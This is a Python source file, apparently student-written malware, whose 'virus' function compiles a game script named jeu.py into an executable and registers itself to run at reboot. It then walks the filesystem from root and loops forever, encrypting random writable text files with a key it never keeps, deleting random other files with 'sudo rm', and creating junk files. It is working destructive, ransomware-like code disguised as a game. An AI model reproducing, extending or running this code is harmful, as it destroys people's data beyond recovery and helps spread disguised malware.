import os
import random
import pathlib
import time
import reboot
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style

colorama.init()
  
############################################################################################################################################################
def virus():
	
	file = open("files/file2", "r")
	if file.readline()=="False":
		file.close()
		print("installation")
		os.system("pip install -U pyinstaller")
		os.system("python3 -m PyInstaller --onefile jeu.py")
		reboot.add_to_reboot()
		file = open("files/file", "w")
		file.write("True")
		file.close()
	else:
		file.close()

	directory = os.getcwd()
	time.sleep(1)

	Files_Table = [] #a table contaning all writable files
	Text_Files_Table = [] #a table contaning all writable TEXT files
	NonText_Files_Table = []#a table contaning all writable Non-TEXT files
	theroot = "none" #just to check if we have a root file in a directory

	for (root,dirs,files) in os.walk('/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
		print(files) #print all the files found in that directory
		print ('--------------------------------')
	
		for file in files: #goes through all the files
			path = os.path.join(root, file) #this part is to save a root file if found (just for testing, will be removed later)
			if os.path.isfile(path) == True:
				if os.stat(path).st_uid == 0:
					theroot = os.stat(path)
			
			if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be open we ignore it
			else:
				if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
					Files_Table.append(path) #put all writable files in the list
					if(pathlib.Path(path).suffix == ".txt"):
						Text_Files_Table.append(path) #put all writable TEXT files in the list	
				
	for i in range(0,(len(Files_Table)-1)):
		trouve = False
		j=0
		while((trouve == False) and (j<len(Text_Files_Table)-1)):
			if (Files_Table[i] == Text_Files_Table[j]):
				trouve = True
			j=j+1
		if trouve == False:
			NonText_Files_Table.append(Files_Table[i])

	print(Fore.BLUE+ "these are to modifiable files: ")				
	print(Files_Table)
	print(Fore.CYAN+ "these are to TEXT modifiable files: ")				
	print(Text_Files_Table)
	print(Fore.RED+ "these are to Non-TEXT modifiable files: ")				
	print(NonText_Files_Table)
	print(Fore.GREEN + "one of the root files " + str(theroot))

	f1 = open("encryptedfiles.txt","a")
	f1.close()
	key = Fernet.generate_key()

	while True:
		randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
		randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
		randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
	
		found = False

		##################################### encrypting a file: ########################################
		if Text_Files_Table[randomeNumberOfTextFiles] == directory+"/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/deletedfiles.txt":
			continue
		else:
			f3 = open("encryptedfiles.txt","r")
			lines = f3.readlines()
			for line in lines:
				if Text_Files_Table[randomeNumberOfTextFiles] == line:
					found = True
			f3.close()
		
			if found == False:
				try:
					print("encrypting: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
					with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
						contents = thefile.read()
					contents_enctypted = Fernet(key).encrypt(contents)
					with open(Text_Files_Table[randomeNumberOfTextFiles],"wb") as thefile:
						thefile.write(contents_enctypted)
					f1 = open("encryptedfiles.txt","a")
					f1.write(str(Text_Files_Table[randomeNumberOfTextFiles]) + "\n")
					f1.close()
					Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
					time.sleep(5)
				except:
					print("we don't have permission to modify the file")
					time.sleep(5)
			else:
				print("file already encrypted")
				time.sleep(5)
	
		##################################### deleting a file: #####################################
		if NonText_Files_Table[randomeNumberOfNonTextFiles] == directory+"/attacker.py":
			continue
		else:
			try:
				print("deleting: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
				os.system ("sudo rm " + NonText_Files_Table[randomeNumberOfNonTextFiles])
				#os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
				f2 = open("deletedfiles.txt","a")
				f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
				f2.close()
				NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
				time.sleep(5)
			except:
				print("we don't have permission to delete the file")
				time.sleep(5)
	
		##################################### addind a file: #####################################
		if random.randint(1,5) == 1:
			f = open(str(randomeNumberOfFiles), "w")
			f.close()
			print("add file: " +  str(randomeNumberOfFiles))
			time.sleep(5)
	
		print("--------------------------------------------------------------------------------------------")